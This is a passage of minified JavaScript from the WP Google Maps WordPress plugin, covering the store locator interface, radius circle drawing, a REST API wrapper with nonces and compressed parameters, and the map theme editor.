p,c=this.getTransformedRadius(e.radius)+l*e.numOuterRings+1,g=context.createRadialGradient(0,0,0,0,0,c),h=(s=WPGMZA.hexToRgba(e.color),WPGMZA.rgbaToString(s));s.a=0,p=WPGMZA.rgbaToString(s),g.addColorStop(0,h),g.addColorStop(1,p),context.save(),context.translate(i.x,i.y),context.strokeStyle=g,context.lineWidth=2/a;for(var u=0;u<e.numSpokes;u++)P=e.spokesStartAngle+2*Math.PI*(u/e.numSpokes),M=Math.cos(P)*c,m=Math.sin(P)*c,context.setLineDash([2/a,15/a]),context.beginPath(),context.moveTo(0,0),context.lineTo(M,m),context.stroke();for(context.setLineDash([]),context.restore(),context.lineWidth=1/a*e.innerRingLineWidth,u=1;u<=e.numInnerRings;u++)c=u*l,e.innerRingFade&&(s.a=1-(u-1)/e.numInnerRings),context.strokeStyle=WPGMZA.rgbaToString(s),context.beginPath(),context.arc(i.x,i.y,c,0,2*Math.PI),context.stroke(),context.closePath();for(context.strokeStyle=e.color,context.lineWidth=1/a*e.centerRingLineWidth,context.beginPath(),context.arc(i.x,i.y,this.getTransformedRadius(e.radius),0,2*Math.PI),context.stroke(),context.closePath(),c+=l,u=0;u<e.numOuterRings;u++)e.innerRingFade&&(s.a=1-u/e.numOuterRings),context.strokeStyle=WPGMZA.rgbaToString(s),context.beginPath(),context.arc(i.x,i.y,c,0,2*Math.PI),context.stroke(),context.closePath(),c+=l;if(0<e.numRadiusLabels){var d,M,m;for(c=this.getTransformedRadius(e.radius),(d=e.radiusLabelFont.match(/(\d+)px/))&&parseInt(d[1]),context.font=e.radiusLabelFont,context.textAlign="center",context.textBaseline="middle",context.fillStyle=e.color,context.save(),context.translate(i.x,i.y),u=0;u<e.numRadiusLabels;u++){var P,f,y=(P=e.radiusLabelsStartAngle+2*Math.PI*(u/e.numRadiusLabels))+Math.PI/2,A=e.radiusString;0<Math.sin(P)&&(y-=Math.PI),M=Math.cos(P)*c,m=Math.sin(P)*c,context.save(),context.translate(M,m),context.rotate(y),context.scale(1/a,1/a),f=context.measureText(A).width,height=f/2,context.clearRect(-f,-height,2*f,2*height),context.fillText(e.radiusString,0,0),context.restore()}context.restore()}}}})),jQuery((function(e){WPGMZA.ModernStoreLocator=function(t){var o,n=this,a=WPGMZA.getMapByID(t);if(WPGMZA.assertInstanceOf(this,"ModernStoreLocator"),(o=WPGMZA.isProVersion()?e(".wpgmza_sl_search_button[mid='"+t+"'], .wpgmza_sl_search_button_"+t).closest(".wpgmza_sl_main_div"):e(".wpgmza_sl_search_button").closest(".wpgmza_sl_main_div")).length){this.element=e("<div class='wpgmza-modern-store-locator'><div class='wpgmza-inner wpgmza-modern-hover-opaque'/></div>")[0];var r,i=e(this.element).find(".wpgmza-inner");r=WPGMZA.isProVersion()?e(o).find(".addressInput"):e(o).find("#addressInput"),wpgmaps_localize[t].other_settings.store_locator_query_string&&wpgmaps_localize[t].other_settings.store_locator_query_string.length&&r.attr("placeholder",wpgmaps_localize[t].other_settings.store_locator_query_string),i.append(r);var s,l=e(o).find("[id='nameInput_"+t+"']");if(l.length){var p=wpgmaps_localize[t].other_settings.store_locator_name_string;p&&p.length&&l.attr("placeholder",p),i.append(l)}(s=e(o).find("button.wpgmza-use-my-location"))&&i.append(s),e(r).on("keydown keypress",(function(e){13==e.keyCode&&(n.searchButton.trigger("click"),searchLocations(t),a.storeLocator.onSearch(e))})),e(r).on("input",(function(e){n.searchButton.show(),n.resetButton.hide()})),i.append(e(o).find("select.wpgmza_sl_radius_select")),this.searchButton=e(o).find(".wpgmza_sl_search_button, .wpgmza_sl_search_button_div"),i.append(this.searchButton),this.resetButton=e(o).find(".wpgmza_sl_reset_button_div"),i.append(this.resetButton),this.resetButton.on("click",(function(e){resetLocations(t)})),this.resetButton.hide(),WPGMZA.isProVersion()&&(this.searchButton.on("click",(function(o){0!=e("addressInput_"+t).val()&&(n.searchButton.hide(),n.resetButton.show(),a.storeLocator.state=WPGMZA.StoreLocator.STATE_APPLIED)})),this.resetButton.on("click",(function(e){n.resetButton.hide(),n.searchButton.show(),a.storeLocator.state=WPGMZA.StoreLocator.STATE_INITIAL}))),i.append(e("#wpgmza_distance_type_"+t));var c=e(o).find(".wpgmza_cat_checkbox_holder"),g=(e(c).children("ul"),e(c).find("li")),h=0,u=[];g.each((function(t,o){var n=e(o).attr("class").match(/\d+/);for(var a in wpgmza_category_data)if(n==a){var r=wpgmza_category_data[a].image,i=e('<div class="wpgmza-chip-icon"/>');i.css({"background-image":"url('"+r+"')",width:e("#wpgmza_cat_checkbox_"+a+" + label").height()+"px"}),u.push(i),null!=r&&""!=r&&e("#wpgmza_cat_checkbox_"+a+" + label").prepend(i),h++;break}})),e(this.element).append(c),h&&(this.optionsButton=e('<span class="wpgmza_store_locator_options_button"><i class="fa fa-list"></i></span>'),e(this.searchButton).before(this.optionsButton)),setInterval((function(){u.forEach((function(t){var o=e(t).height();e(t).css({width:o+"px"}),e(t).closest("label").css({"padding-left":o+8+"px"})})),e(c).css("width",e(n.element).find(".wpgmza-inner").outerWidth()+"px")}),1e3),e(this.element).find(".wpgmza_store_locator_options_button").on("click",(function(e){c.hasClass("wpgmza-open")?c.removeClass("wpgmza-open"):c.addClass("wpgmza-open")})),e(o).remove(),e(this.element).find("input, select").on("focus",(function(){e(i).addClass("active")})),e(this.element).find("input, select").on("blur",(function(){e(i).removeClass("active")})),e(this.element).on("mouseover","li.wpgmza_cat_checkbox_item_holder",(function(e){n.onMouseOverCategory(e)})),e(this.element).on("mouseleave","li.wpgmza_cat_checkbox_item_holder",(function(e){n.onMouseLeaveCategory(e)})),e(a.markerFilter).on("filteringcomplete",(function(e){this.map.hasVisibleMarkers()||(this.map.settings.store_locator_not_found_message!=WPGMZA.localized_strings.zero_results&&""!=this.map.settings.store_locator_not_found_message?alert(this.map.settings.store_locator_not_found_message):alert(WPGMZA.localized_strings.zero_results))})),e("body").on("click",".wpgmza_store_locator_options_button",(function(t){setTimeout((function(){if(e(".wpgmza_cat_checkbox_holder").hasClass("wpgmza-open")){var t=e(".wpgmza_cat_checkbox_holder"),o=t.position().top+t.outerHeight(!0)+e(".wpgmza-modern-store-locator").height(),n=e(".wpgmza_map");n.position().top+n.outerHeight(!0)<=o&&(e(".wpgmza_cat_ul").css("overflow","scroll "),e(".wpgmza_cat_ul").css("height","100%"),e(".wpgmza-modern-store-locator").css("height","100%"),e(".wpgmza_cat_checkbox_holder.wpgmza-open").css({"padding-bottom":"50px",height:"100%"}))}}),500)}))}},WPGMZA.ModernStoreLocator.createInstance=function(e){return"open-layers"===WPGMZA.settings.engine?new WPGMZA.OLModernStoreLocator(e):new WPGMZA.GoogleModernStoreLocator(e)},WPGMZA.ModernStoreLocator.prototype.onMouseOverCategory=function(t){var o=t.currentTarget;e(o).children("ul.wpgmza_cat_checkbox_item_holder").stop(!0,!1).fadeIn()},WPGMZA.ModernStoreLocator.prototype.onMouseLeaveCategory=function(t){var o=t.currentTarget;e(o).children("ul.wpgmza_cat_checkbox_item_holder").stop(!0,!1).fadeOut()}})),jQuery((function(e){WPGMZA.NativeMapsAppIcon=function(){navigator.userAgent.match(/^Apple|iPhone|iPad|iPod/)?(this.type="apple",this.element=e('<span><i class="fab fa fa-apple" aria-hidden="true"></i></span>')):(this.type="google",this.element=e('<span><i class="fab fa fa-google" aria-hidden="true"></i></span>'))}})),jQuery((function(e){Uint8Array.prototype.slice||Object.defineProperty(Uint8Array.prototype,"slice",{value:function(e,t){return new Uint8Array(Array.prototype.slice.call(this,e,t))}}),WPGMZA.isSafari()&&!window.external&&(window.external={})})),jQuery((function(e){WPGMZA.Polygon=function(e,t){WPGMZA.assertInstanceOf(this,"Polygon"),this.paths=null,this.title=null,this.name=null,this.link=null,WPGMZA.MapObject.apply(this,arguments)},WPGMZA.Polygon.prototype=Object.create(WPGMZA.MapObject.prototype),WPGMZA.Polygon.prototype.constructor=WPGMZA.Polygon,WPGMZA.Polygon.getConstructor=function(){return"open-layers"===WPGMZA.settings.engine?WPGMZA.isProVersion()?WPGMZA.OLProPolygon:WPGMZA.OLPolygon:WPGMZA.isProVersion()?WPGMZA.GoogleProPolygon:WPGMZA.GooglePolygon},WPGMZA.Polygon.createInstance=function(e,t){return new(WPGMZA.Polygon.getConstructor())(e,t)},WPGMZA.Polygon.prototype.toJSON=function(){var t=WPGMZA.MapObject.prototype.toJSON.call(this);return e.extend(t,{name:this.name,title:this.title,link:this.link}),t}})),jQuery((function(e){WPGMZA.Polyline=function(e,t){WPGMZA.assertInstanceOf(this,"Polyline"),this.title=null,WPGMZA.MapObject.apply(this,arguments)},WPGMZA.Polyline.prototype=Object.create(WPGMZA.MapObject.prototype),WPGMZA.Polyline.prototype.constructor=WPGMZA.Polyline,WPGMZA.Polyline.getConstructor=function(){return"open-layers"===WPGMZA.settings.engine?WPGMZA.OLPolyline:WPGMZA.GooglePolyline},WPGMZA.Polyline.createInstance=function(e,t){return new(WPGMZA.Polyline.getConstructor())(e,t)},WPGMZA.Polyline.prototype.getPoints=function(){return this.toJSON().points},WPGMZA.Polyline.prototype.toJSON=function(){var e=WPGMZA.MapObject.prototype.toJSON.call(this);return e.title=this.title,e}})),jQuery((function(e){WPGMZA.PopoutPanel=function(e){this.element=e},WPGMZA.PopoutPanel.prototype.open=function(){e(this.element).addClass("wpgmza-open")},WPGMZA.PopoutPanel.prototype.close=function(){e(this.element).removeClass("wpgmza-open")}})),jQuery((function(e){function t(t,o){if((o=e.extend({},o)).data||(o.data={}),"route"in o.data)throw new Error("Cannot send route through this method");if("action"in o.data)throw new Error("Cannot send action through this method");return o.data.route=t,o.data.action="wpgmza_rest_api_request",WPGMZA.restAPI.addNonce(t,o,WPGMZA.RestAPI.CONTEXT_AJAX),e.ajax(WPGMZA.ajaxurl,o)}WPGMZA.RestAPI=function(){WPGMZA.RestAPI.URL=WPGMZA.resturl,this.useAJAXFallback=!1},WPGMZA.RestAPI.CONTEXT_REST="REST",WPGMZA.RestAPI.CONTEXT_AJAX="AJAX",WPGMZA.RestAPI.createInstance=function(){return new WPGMZA.RestAPI},Object.defineProperty(WPGMZA.RestAPI.prototype,"isCompressedPathVariableSupported",{get:function(){return WPGMZA.serverCanInflate&&"Uint8Array"in window&&"TextEncoder"in window}}),Object.defineProperty(WPGMZA.RestAPI.prototype,"isCompressedPathVariableAllowed",{get:function(){return!WPGMZA.pro_version||WPGMZA.Version.compare(WPGMZA.pro_version,"8.0.0")>=WPGMZA.Version.EQUAL_TO?!WPGMZA.settings.disable_compressed_path_variables:WPGMZA.settings.enable_compressed_path_variables}}),Object.defineProperty(WPGMZA.RestAPI.prototype,"maxURLLength",{get:function(){return 2083}}),WPGMZA.RestAPI.prototype.compressParams=function(e){var t="";if(e.markerIDs){var o=e.markerIDs.split(",");if(1<o.length){var n=(new WPGMZA.EliasFano).encode(o),a=pako.deflate(n),r=Array.prototype.map.call(a,(function(e){return String.fromCharCode(e)})).join("");t="/"+btoa(r).replace(/\//g,"-").replace(/=+$/,""),e.midcbp=n.pointer,delete e.markerIDs}}r=JSON.stringify(e);var i=(new TextEncoder).encode(r),s=(a=pako.deflate(i),Array.prototype.map.call(a,(function(e){return String.fromCharCode(e)})).join(""));return btoa(s).replace(/\//g,"-").replace(/=+$/,"")+t},WPGMZA.RestAPI.prototype.getNonce=function(e){var t=[];for(var o in WPGMZA.restnoncetable){var n=new RegExp(o);e.match(n)&&t.push({pattern:o,nonce:WPGMZA.restnoncetable[o],length:o.length})}if(!t.length)throw new Error("No nonce found for route");return t.sort((function(e,t){return t.length-e.length})),t[0].nonce},WPGMZA.RestAPI.prototype.addNonce=function(e,t,o){function n(n){o==WPGMZA.RestAPI.CONTEXT_REST&&n.setRequestHeader("X-WP-Nonce",WPGMZA.restnonce),t&&t.method&&!t.method.match(/^GET$/i)&&n.setRequestHeader("X-WPGMZA-Action-Nonce",a.getNonce(e))}var a=this;if(t.beforeSend){var r=t.beforeSend;t.beforeSend=function(e){r(e),n(e)}}else t.beforeSend=n},WPGMZA.RestAPI.prototype.call=function(o,n){if(this.useAJAXFallback)return t(o,n);var a=!1,r=o,i=e.extend({},n);if("string"!=typeof o||!o.match(/^\//)&&!o.match(/^http/))throw new Error("Invalid route");if(WPGMZA.RestAPI.URL.match(/\/$/)&&(o=o.replace(/^\//,"")),n=n||{},this.addNonce(o,n,WPGMZA.RestAPI.CONTEXT_REST),n.error||(n.error=function(o,n,s){if("abort"!=n){switch(o.status){case 401:case 403:return e.post(WPGMZA.ajaxurl,{action:"wpgmza_report_rest_api_blocked"},(function(e){})),console.warn("The REST API was blocked. This is usually due to security plugins blocking REST requests for non-authenticated users."),this.useAJAXFallback=!0,t(r,i);case 414:if(!a)break;return i.method="POST",i.useCompressedPathVariable=!1,WPGMZA.restAPI.call(r,i)}throw new Error(s)}}),n.useCompressedPathVariable&&this.isCompressedPathVariableSupported&&this.isCompressedPathVariableAllowed){var s=e.extend({},n),l=n.data,p=this.compressParams(l);WPGMZA.isServerIIS&&(p=p.replace(/\+/g,"%20"));var c=o.replace(/\/$/,"")+"/base64"+p;WPGMZA.RestAPI.URL,s.method="GET",delete s.data,!1===n.cache&&(s.data={skip_cache:1}),c.length<this.maxURLLength?(a=!0,o=c,n=s):(WPGMZA.RestAPI.compressedPathVariableURLLimitWarningDisplayed||console.warn("Compressed path variable route would exceed URL length limit"),WPGMZA.RestAPI.compressedPathVariableURLLimitWarningDisplayed=!0)}return WPGMZA.RestAPI.URL.match(/\?/)&&(o=o.replace(/\?/,"&")),e.ajax(WPGMZA.RestAPI.URL+o,n)};var o=WPGMZA.RestAPI.call;WPGMZA.RestAPI.call=function(){console.warn("WPGMZA.RestAPI.call was called statically, did you mean to call the function on WPGMZA.restAPI?"),o.apply(this,arguments)},e(document.body).on("click","#wpgmza-rest-api-blocked button.notice-dismiss",(function(e){WPGMZA.restAPI.call("/rest-api/",{method:"POST",data:{dismiss_blocked_notice:!0}})}))})),jQuery((function(e){WPGMZA.SettingsPage=function(){e("#wpgmza-global-settings").tabs()},WPGMZA.SettingsPage.createInstance=function(){return new WPGMZA.SettingsPage},e(window).on("load",(function(e){var t=WPGMZA.settings.useLegacyHTML||!window.location.href.match(/no-legacy-html/);WPGMZA.getCurrentPage()!=WPGMZA.PAGE_SETTINGS||t||(WPGMZA.settingsPage=WPGMZA.SettingsPage.createInstance())}))})),jQuery((function(e){WPGMZA.StoreLocator=function(t,o){var n=this;WPGMZA.EventDispatcher.call(this),this._center=null,this.map=t,this.element=o,(this.element.wpgmzaStoreLocator=this).state=WPGMZA.StoreLocator.STATE_INITIAL,e(o).find(".wpgmza-not-found-msg").hide(),this.addressInput=WPGMZA.AddressInput.createInstance(e(o).find("input.wpgmza-address")[0],t),this.map.on("storelocatorgeocodecomplete",(function(e){n.onGeocodeComplete(e)})),this.map.on("init",(function(e){n.map.markerFilter.on("filteringcomplete",(function(e){n.onFilteringComplete(e)}))})),e(o).on("keypress","input",(function(e){13==e.which&&(searchLocations(n.map.id),n.onSearch(e))})),e(document.body).on("click",".wpgmza_sl_search_button_"+t.id+", [data-map-id='"+t.id+"'] .wpgmza_sl_search_button",(function(e){n.onSearch(e)})),e(document.body).on("click",".wpgmza_sl_reset_button_"+t.id+", [data-map-id='"+t.id+"'] .wpgmza_sl_reset_button_div",(function(e){n.onReset(e)}))},WPGMZA.StoreLocator.prototype=Object.create(WPGMZA.EventDispatcher.prototype),WPGMZA.StoreLocator.prototype.constructor=WPGMZA.StoreLocator,WPGMZA.StoreLocator.STATE_INITIAL="initial",WPGMZA.StoreLocator.STATE_APPLIED="applied",WPGMZA.StoreLocator.createInstance=function(e,t){return new WPGMZA.StoreLocator(e,t)},Object.defineProperty(WPGMZA.StoreLocator.prototype,"distanceUnits",{get:function(){return 1==this.map.settings.store_locator_distance?WPGMZA.Distance.MILES:WPGMZA.Distance.KILOMETERS}}),Object.defineProperty(WPGMZA.StoreLocator.prototype,"radius",{get:function(){return e("#radiusSelect, #radiusSelect_"+this.map.id).val()}}),Object.defineProperty(WPGMZA.StoreLocator.prototype,"center",{get:function(){return this._center}}),Object.defineProperty(WPGMZA.StoreLocator.prototype,"bounds",{get:function(){return this._bounds}}),Object.defineProperty(WPGMZA.StoreLocator.prototype,"marker",{get:function(){return 1!=this.map.settings.store_locator_bounce?null:(this._marker||(this._marker=WPGMZA.Marker.createInstance({visible:!1}),this._marker.disableInfoWindow=!0,this._marker.isFilterable=!1,this._marker.setAnimation(WPGMZA.Marker.ANIMATION_BOUNCE)),this._marker)}}),Object.defineProperty(WPGMZA.StoreLocator.prototype,"circle",{get:function(){return this._circle||("modern"!=this.map.settings.wpgmza_store_locator_radius_style||WPGMZA.isDeviceiOS()?this._circle=WPGMZA.Circle.createInstance({strokeColor:"#ff0000",strokeOpacity:"0.25",strokeWeight:2,fillColor:"#ff0000",fillOpacity:"0.15",visible:!1,clickable:!1}):(this._circle=WPGMZA.ModernStoreLocatorCircle.createInstance(this.map.id),this._circle.settings.color=this.circleStrokeColor)),this._circle}}),WPGMZA.StoreLocator.prototype.onGeocodeComplete=function(e){if(!e.results||!e.results.length)return this._center=null,void(this._bounds=null);this._center=new WPGMZA.LatLng(e.results[0].latLng),this._bounds=new WPGMZA.LatLngBounds(e.results[0].bounds),this.map.markerFilter.update({},this)},WPGMZA.StoreLocator.prototype.onSearch=function(e){this.state=WPGMZA.StoreLocator.STATE_APPLIED},WPGMZA.StoreLocator.prototype.onReset=function(e){this.state=WPGMZA.StoreLocator.STATE_INITIAL,this._center=null,this._bounds=null,this.map.markerFilter.update({},this)},WPGMZA.StoreLocator.prototype.getFilteringParameters=function(){return this.center?{center:this.center,radius:this.radius}:{}},WPGMZA.StoreLocator.prototype.onFilteringComplete=function(t){var o=t.filteringParams,n=this.marker;n&&n.setVisible(!1),o.center&&n&&(n.setPosition(o.center),n.setVisible(!0),n.map!=this.map&&this.map.addMarker(n));var a=this.circle;if(a){var r=this.distanceUnits==WPGMZA.Distance.MILES?WPGMZA.Distance.KILOMETERS_PER_MILE:1;a.setVisible(!1),o.center&&o.radius&&(a.setRadius(o.radius*r),a.setCenter(o.center),a.setVisible(!0),a.map!=this.map&&this.map.addCircle(a)),a instanceof WPGMZA.ModernStoreLocatorCircle&&(a.settings.radiusString=this.radius)}this.map.hasVisibleMarkers()?e(this.element).find(".wpgmza-not-found-msg").hide():e(this.element).find(".wpgmza-not-found-msg").show()}})),jQuery((function(e){WPGMZA.Text=function(e){if(e)for(var t in e)this[t]=e[t]},WPGMZA.Text.createInstance=function(e){return"open-layers"===WPGMZA.settings.engine?new WPGMZA.OLText(e):new WPGMZA.GoogleText(e)}})),jQuery((function(e){WPGMZA.ThemeEditor=function(){WPGMZA.EventDispatcher.call(this),this.element=e("#wpgmza-theme-editor"),this.element.length?"open-layers"!=WPGMZA.settings.engine?(this.json=[{}],this.mapElement=WPGMZA.maps[0].element,this.element.appendTo("#wpgmza-map-theme-editor__holder"),e(window).on("scroll",(function(e){})),setInterval((function(){}),200),this.initHTML(),WPGMZA.themeEditor=this):this.element.remove():console.warn("No element to initialise theme editor on")},WPGMZA.extend(WPGMZA.ThemeEditor,WPGMZA.EventDispatcher),WPGMZA.ThemeEditor.prototype.updatePosition=function(){},WPGMZA.ThemeEditor.features={all:[],administrative:["country","land_parcel","locality","neighborhood","province"],landscape:["man_made","natural","natural.landcover","natural.terrain"],poi:["attraction","business","government","medical","park","place_of_worship","school","sports_complex"],road:["arterial","highway","highway.controlled_access","local"],transit:["line","station","station.airport","station.bus","station.rail"],water:[]},WPGMZA.ThemeEditor.elements={all:[],geometry:["fill","stroke"],labels:["icon","text","text.fill","text.stroke"]},WPGMZA.ThemeEditor.prototype.parse=function(){e("#wpgmza_theme_editor_feature option, #wpgmza_theme_editor_element option").css("font-weight","normal"),e("#wpgmza_theme_editor_error").hide(),e("#wpgmza_theme_editor").show(),e("#wpgmza_theme_editor_do_hue").prop("checked",!1),e("#wpgmza_theme_editor_hue").val("#000000"),e("#wpgmza_theme_editor_lightness").val(""),e("#wpgmza_theme_editor_saturation").val(""),e("#wpgmza_theme_editor_gamma").val(""),e("#wpgmza_theme_editor_do_invert_lightness").prop("checked",!1),e("#wpgmza_theme_editor_visibility").val("inherit"),e("#wpgmza_theme_editor_do_color").prop("checked",!1),e("#wpgmza_theme_editor_color").val("#000000"),e("#wpgmza_theme_editor_weight").val("");var t=e('textarea[name="wpgmza_theme_data"]');if(!t.val()||t.val().length<1)this.json=[{}];else{try{this.json=e.parseJSON(e('textarea[name="wpgmza_theme_data"]').val())}catch(t){return this.json=[{}],e("#wpgmza_theme_editor").hide(),void e("#wpgmza_theme_editor_error").show()}if(!e.isArray(this.json)){var o=this.json;this.json=[],this.json.push(o)}this.highlightFeatures(),this.highlightElements(),this.loadElementStylers()}},WPGMZA.ThemeEditor.prototype.highlightFeatures=function(){e("#wpgmza_theme_editor_feature option").css("font-weight","normal"),e.each(this.json,(function(t,o){o.hasOwnProperty("featureType")?e('#wpgmza_theme_editor_feature option[value="'+o.featureType+'"]').css("font-weight","bold"):e('#wpgmza_theme_editor_feature option[value="all"]').css("font-weight","bold")}))},WPGMZA.ThemeEditor.prototype.highlightElements=function(){var t=e("#wpgmza_theme_editor_feature").val();e("#wpgmza_theme_editor_element option").css("font-weight","normal"),e.each(this.json,(function(o,n){(n.hasOwnProperty("featureType")&&n.featureType==t||"all"==t&&!n.hasOwnProperty("featureType"))&&(n.hasOwnProperty("elementType")?e('#wpgmza_theme_editor_element option[value="'+n.elementType+'"]').css("font-weight","bold"):e('#wpgmza_theme_editor_element option[value="all"]').css("font-weight","bold"))}))},WPGMZA.ThemeEditor.prototype.loadElementStylers=function(){var t=e("#wpgmza_theme_editor_feature").val(),o=e("#wpgmza_theme_editor_element").val();e("#wpgmza_theme_editor_do_hue").prop("checked",!1),e("#wpgmza_theme_editor_hue").val("#000000"),e("#wpgmza_theme_editor_lightness").val(""),e("#wpgmza_theme_editor_saturation").val(""),e("#wpgmza_theme_editor_gamma").val(""),e("#wpgmza_theme_editor_do_invert_lightness").prop("checked",!1),e("#wpgmza_theme_editor_visibility").val("inherit"),e("#wpgmza_theme_editor_do_color").prop("checked",!1),e("#wpgmza_theme_editor_color").val("#000000"),e("#wpgmza_theme_editor_weight").val(""),e.each(this.json,(function(n,a){(a.hasOwnProperty("featureType")&&a.featureType==t||"all"==t&&!a.hasOwnProperty("featureType"))&&(a.hasOwnProperty("elementType")&&a.elementType==o||"all"==o&&!a.hasOwnProperty("elementType"))&&a.hasOwnProperty("stylers")&&e.isArray(a.stylers)&&0<a.stylers.length&&e.each(a.stylers,(function(t,o){o.hasOwnProperty("hue")&&(e("#wpgmza_theme_editor_do_hue").prop("checked",!0),e("#wpgmza_theme_editor_hue").val(o.hue)),o.hasOwnProperty("lightness")&&e("#wpgmza_theme_editor_lightness").val(o.lightness),o.hasOwnProperty("saturation")&&e("#wpgmza_theme_editor_saturation").val(o.xaturation),o.hasOwnProperty("gamma")&&e("#wpgmza_theme_editor_gamma").val(o.gamma),o.hasOwnProperty("invert_lightness")&&e("#wpgmza_theme_editor_do_invert_lightness").prop("checked",!0),o.hasOwnProperty("visibility")&&e("#wpgmza_theme_editor_visibility").val(o.visibility),o.hasOwnProperty("color")&&(e("#wpgmza_theme_editor_do_color").prop("checked",!0),e("#wpgmza_theme_editor_color").val(o.color)),o.hasOwnProperty("weight")&&e("#wpgmza_theme_editor_weight").val(o.weight)}))}))},WPGMZA.ThemeEditor.prototype.writeElementStylers=function(){var t=e("#wpgmza_theme_editor_feature").val(),o=e("#wpgmza_theme_editor_element").val(),n=null,a=[];if("inherit"!=e("#wpgmza_theme_editor_visibility").val()&&a.push({visibility:e("#wpgmza_theme_editor_visibility").val()}),!0===e("#wpgmza_theme_editor_do_color").prop("checked")&&a.push({color:e("#wpgmza_theme_editor_color").val()}),!0===e("#wpgmza_theme_editor_do_hue").prop("checked")&&a.push({hue:e("#wpgmza_theme_editor_hue").val()}),0<e("#wpgmza_theme_editor_gamma").val().length&&a.push({gamma:parseFloat(e("#wpgmza_theme_editor_gamma").val())}),0<e("#wpgmza_theme_editor_weight").val().length&&a.push({weight:parseFloat(e("#wpgmza_theme_editor_weight").val())}),0<e("#wpgmza_theme_editor_saturation").val().length&&a.push({saturation:parseFloat(e("#wpgmza_theme_editor_saturation").val())}),0<e("#wpgmza_theme_editor_lightness").val().length&&a.push({lightness:parseFloat(e("#wpgmza_theme_editor_lightness").val())}),!0===e("#wpgmza_theme_editor_do_invert_lightness").prop("checked")&&a.push({invert_lightness:!0}),e.each(this.json,(function(e,a){(a.hasOwnProperty("featureType")&&a.featureType==t||"all"==t&&!a.hasOwnProperty("featureType"))&&(a.hasOwnProperty("elementType")&&a.elementType==o||"all"==o&&!a.hasOwnProperty("elementType"))&&(n=e)})),null===n){if(0<a.length){var r={};"all"!=t&&(r.featureType=t),"all"!=o&&(r.elementType=o),r.stylers=a,this.json.push(r)}}else 0<a.length?this.json[n].stylers=a:this.json.splice(n,1);e('textarea[name="wpgmza_theme_data"]').val(JSON.stringify(this.json).replace(/:/g,": ").replace(/,/g,", ")),this.highlightFeatures(),this.highlightElements(),WPGMZA.themePanel.updateMapTheme()},WPGMZA.ThemeEditor.prototype.initHTML=function(){var t=this;e.each(WPGMZA.ThemeEditor.features,(function(t,o){e("#wpgmza_theme_editor_feature").append('<option value="'+t+'">'+t+"</option>"),0<o.length&&e.each(o,(function(o,n){e("#wpgmza_theme_editor_feature").append('<option value="'+t+"."+n+'">'+t+"."+n+"</option>")}))})),e.each(WPGMZA.ThemeEditor.elements,(function(t,o){e("#wpgmza_theme_editor_element").append('<option value="'+t+'">'+t+"</option>"),0<o.length&&e.each(o,(function(o,n){e("#wpgmza_theme_editor_element").append('<option value="'+t+"."+n+'">'+t+"."+n+"</option>")}))})),this.parse(),e('textarea[name="wpgmza_theme_data"]').on("input selectionchange propertychange",(function(){t.parse()})),e(".wpgmza_theme_selection").click((function(){setTimeout((function(){e('textarea[name="wpgmza_theme_data"]').trigger("input")}),1e3)})),e("#wpgmza_theme_editor_feature").on("change",(function(){t.highlightElements(),t.loadElementStylers()})),e("#wpgmza_theme_editor_element").on("change",(function(){t.loadElementStylers()})),e("#wpgmza_theme_editor_do_hue, #wpgmza_theme_editor_hue, #wpgmza_theme_editor_lightness, #wpgmza_theme_editor_saturation, #wpgmza_theme_editor_gamma, #wpgmza_theme_editor_do_invert_lightness, #wpgmza_theme_editor_visibility, #wpgmza_theme_editor_do_color, #wpgmza_theme_editor_color, #wpgmza_theme_editor_weight").on("input selectionchange propertychange",(function(){t.writeElementStylers()})),"open-layers"==WPGMZA.settings.engine&&e("#wpgmza_theme_editor :input").prop("disabled",!0)}})),jQuery((function(e){WPGMZA.ThemePanel=function(){var t=this;this.element=e("#wpgmza-theme-panel"),this.map=WPGMZA.maps[0],this.element.length?(e("#wpgmza-theme-presets").owlCarousel({items:5,dots:!0}),this.element.on("click","#wpgmza-theme-presets label",(function(e){t.onThemePresetClick(e)})),e("#wpgmza-open-theme-editor").on("click",(function(t){e("#wpgmza-map-theme-editor__holder").addClass("active"),e("#wpgmza-theme-editor").addClass("active"),WPGMZA.animateScroll(e("#wpgmza-theme-editor"))})),WPGMZA.themePanel=this):console.warn("No element to initialise theme panel on")},WPGMZA.ThemePanel.previewImageCenter={lat:33.701806462148646,lng:-118.15949896058983},WPGMZA.ThemePanel.previewImageZoom=11,WPGMZA.ThemePanel.prototype.onThemePresetClick=function(t){var o=e(t.currentTarget).find("[data-theme-json]").attr("data-theme-json"),n=e(this.element).find("textarea[name='wpgmza_theme_data']"),a=n.val(),r=[];e(this.element).find("[data-theme-json]").each((function(t,o){r.push(e(o).attr("data-theme-json"))})),a.length&&-1==r.indexOf(a)&&!confirm(WPGMZA.localized_strings.overwrite_theme_data)||(n.val(o),this.updateMapTheme(),WPGMZA.themeEditor.parse())},WPGMZA.ThemePanel.prototype.updateMapTheme=function(){var t;try{t=JSON.parse(e("textarea[name='wpgmza_theme_data']").val())}catch(e){return void alert(WPGMZA.localized_strings.invalid_theme_data)}this.map.setOptions({styles:t})}})),jQuery((function(e){WPGMZA.Version=function(){},WPGMZA.Version.GREATER_THAN=1,WPGMZA.Version.EQUAL_TO=0,WPGMZA.Version.LESS_THAN=-1,WPGMZA.Version.compare=function(e,t){for(var o=e.match(/\d+/g),n=t.match(/\d+/g),a=0;a<o.length;++a){if(n.length===a)return 1;if(o[a]!==n[a])return o[a]>n[a]?1:-1}return o.length!=n.length?-1:0}})),jQuery((function(e){WPGMZA.Integration={},WPGMZA.integrationModules={}})),jQuery((function(e){if(window.wp&&wp.i18n&&wp.blocks&&wp.editor&&wp.components){var t=wp.i18n.__,o=wp.blocks.registerBlockType,n=wp.editor,a=n.InspectorControls,r=(n.BlockControls,wp.components),i=r.Dashicon,s=(r.Toolbar,r.Button,r.Tooltip,r.PanelBody);r.TextareaControl,r.CheckboxControl,r.TextControl,r.SelectControl,r.RichText,WPGMZA.Integration.Gutenberg=function(){o("gutenberg-wpgmza/block",this.getBlockDefinition())},WPGMZA.Integration.Gutenberg.prototype.getBlockTitle=function(){return t("WP Google Maps")},WPGMZA.Integration.Gutenberg.prototype.getBlockInspectorControls=function(e){return React.createElement(a,{key:"inspector"},React.createElement(s,{title:t("Map Settings")},React.createElement("p",{class:"map-block-gutenberg-button-container"},React.createElement("a",{href:WPGMZA.adminurl+"admin.php?page=wp-google-maps-menu&action=edit&map_id=1",target:"_blank",class:"button button-primary"},React.createElement("i",{class:"fa fa-pencil-square-o","aria-hidden":"true"}),t("Go to Map 